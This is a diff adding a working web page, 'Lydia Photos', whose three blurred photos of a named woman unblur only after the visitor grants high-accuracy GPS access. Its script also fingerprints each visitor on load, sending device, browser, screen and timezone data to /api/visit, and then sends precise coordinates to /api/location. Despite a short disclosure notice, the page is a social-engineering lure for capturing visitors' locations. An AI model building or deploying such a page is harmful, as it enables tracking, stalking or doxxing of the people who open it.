@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Lydia Photos</title>
+<style>
+*{box-sizing:border-box}body{margin:0;background:linear-gradient(135deg,#fff6fa,#ffe2ef);font-family:Arial,sans-serif;color:#3b2430}
+.wrap{width:min(1050px,92%);margin:auto;padding:55px 0 70px;text-align:center}
+h1{margin:0;font:clamp(44px,8vw,78px) Georgia,serif;color:#d65a91;letter-spacing:-2px}
+.sub{color:#8f6477;margin:10px 0 34px}.gallery{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.card{overflow:hidden;border-radius:22px;background:#f4bfd5}.photo{width:100%;aspect-ratio:3/4;object-fit:cover;display:block;filter:blur(18px);transform:scale(1.04);transition:.7s}.unblurred{filter:blur(0);transform:scale(1)}
+.action{margin-top:30px}button{border:0;border-radius:999px;padding:15px 28px;background:#d65a91;color:#fff;font-weight:700;font-size:16px;cursor:pointer}
+button:disabled{opacity:.65;cursor:default}#status{margin-top:10px;color:#8f6477;font-size:13px}
+.notice{max-width:620px;margin:24px auto 0;padding:14px 16px;border-radius:14px;background:#fff8fb;color:#765263;font-size:12px;line-height:1.5}
+@media(max-width:700px){.gallery{grid-template-columns:1fr 1fr}}@media(max-width:450px){.gallery{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<main class="wrap">
+<h1>Lydia Photos</h1>
+<p class="sub">A little collection of Lydia's photos ♡</p>
+<section class="gallery">
+  <div class="card"><img class="photo" src="photos/photo1.jpg" alt="Lydia photo 1"></div>
+  <div class="card"><img class="photo" src="photos/photo2.jpg" alt="Lydia photo 2"></div>
+  <div class="card"><img class="photo" src="photos/photo3.jpg" alt="Lydia photo 3"></div>
+</section>
+<div class="action">
+  <button id="unlock">Unblur Photos</button>
+  <div id="status">To unblur, the site will ask for your location. Your choice is voluntary.</div>
+</div>
+<div class="notice">
+  When you visit, the server receives technical information such as your IP address and browser request headers.
+  If you choose to allow location, the site sends your GPS coordinates and accuracy to the site's server to unlock the photos.
+</div>
+</main>
+<script>
+const photos=document.querySelectorAll(".photo"), btn=document.querySelector("#unlock"), status=document.querySelector("#status");
+function detectOS(){const u=navigator.userAgent; if(/Windows/i.test(u))return"Windows";if(/Android/i.test(u))return"Android";if(/iPhone|iPad|iPod/i.test(u))return"iOS";if(/Mac OS/i.test(u))return"macOS";if(/Linux/i.test(u))return"Linux";return"Other";}
+function detectDevice(){return /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : /Tablet|iPad/i.test(navigator.userAgent) ? "Tablet" : "Desktop";}
+function detectBrowser(){const u=navigator.userAgent;if(/Edg\//.test(u))return"Edge";if(/Chrome\//.test(u))return"Chrome";if(/Firefox\//.test(u))return"Firefox";if(/Safari\//.test(u)&&!/Chrome\//.test(u))return"Safari";return"Other";}
+async function sendVisit(){
+  try{
+    const r=await fetch("/api/visit",{method:"POST",headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({page:location.pathname,referrer:document.referrer||null,device:detectDevice(),os:detectOS(),browser:detectBrowser(),
+      screen:{width:screen.width,height:screen.height,dpr:devicePixelRatio},viewport:{width:innerWidth,height:innerHeight},
+      timezone:Intl.DateTimeFormat().resolvedOptions().timeZone})});
+    return await r.json();
+  }catch{return null}
+}
+let visit=sendVisit();
+
+btn.addEventListener("click",async()=>{
+  btn.disabled=true;
+  status.textContent="Please choose Allow in your browser's location prompt.";
+  if(!navigator.geolocation){status.textContent="Location is not supported by this browser.";btn.disabled=false;return;}
+  const result=await new Promise(resolve=>navigator.geolocation.getCurrentPosition(resolve,()=>resolve(null),{enableHighAccuracy:true,timeout:10000,maximumAge:0}));
+  if(!result){status.textContent="Location was not allowed. Photos remain blurred.";btn.disabled=false;return;}
+  const v=await visit;
+  try{
+    await fetch("/api/location",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({
+      id:v?.id,consent:true,latitude:result.coords.latitude,longitude:result.coords.longitude,accuracy:result.coords.accuracy
+    })});
+  }catch{}
+  photos.forEach(p=>p.classList.add("unblurred"));
+  status.textContent="Photos unlocked.";
+  btn.textContent="Photos Unblurred";
+});
+</script>
+</body>
+</html>
